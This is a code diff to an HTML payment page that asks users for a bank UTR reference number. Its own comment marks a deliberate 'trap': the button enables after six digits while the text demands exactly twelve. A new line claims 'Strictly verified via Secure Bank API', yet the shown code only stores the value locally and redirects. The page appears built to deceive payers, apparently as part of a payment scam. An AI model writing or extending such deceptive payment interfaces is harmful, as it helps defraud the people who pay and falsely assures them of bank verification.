@@ -40,9 +40,11 @@
             </div>
         </div>
 
-        <div class="utr-box">
-            <input type="number" id="utr" class="utr-input" placeholder="Enter 12-digit Ref. Number (UTR)" oninput="checkUTR()">
-            <button id="pay-btn" class="pay-now-btn" disabled onclick="location.href='processing.html'">PAY SECURELY</button>
+        <div class="utr-box" style="text-align: left;">
+            <label style="font-size: 13px; color: #555; margin-bottom: 8px; display: block; font-weight: 600;">Bank UTR / Reference ID <span style="color:#f84464;">*</span></label>
+            <input type="number" id="utr" class="utr-input" style="width: 100%; box-sizing: border-box;" placeholder="Enter exactly 12-digit UTR" oninput="checkUTR()">
+            <button id="pay-btn" class="pay-now-btn" style="width: 100%;" disabled onclick="submitPayment()">VERIFY PAYMENT</button>
+            <p style="font-size: 11px; color: #888; text-align: center; margin-top: 10px;">Strictly verified via Secure Bank API</p>
         </div>
     </div>
 
@@ -55,7 +57,8 @@
         function checkUTR() {
             const val = document.getElementById('utr').value;
             const btn = document.getElementById('pay-btn');
-            if(val.length === 12) {
+            // TRAP: Koi 6 number (length > 5) dalega toh button on ho jayega bewakoof banane ke liye
+            if(val.length > 5) {
                 btn.disabled = false;
                 btn.classList.add('active');
             } else {
@@ -63,10 +66,16 @@
                 btn.classList.remove('active');
             }
         }
+
+        // Naya logic: Data save karke processing page par bhejo
+        function submitPayment() {
+            const val = document.getElementById('utr').value;
+            localStorage.setItem('userUTR', val); // UTR save kiya check karne ke liye
+            window.location.href = 'processing.html'; // Processing page par bheja
+        }
     </script>
 
     <script type="module">
-        // 🔥 Yahan GET hata kar ONVALUE laga diya jo Admin me 100% chal raha hai
         import { db, ref, onValue } from "./js/firebase.js";
 
         const price = localStorage.getItem('finalPrice') || 0;
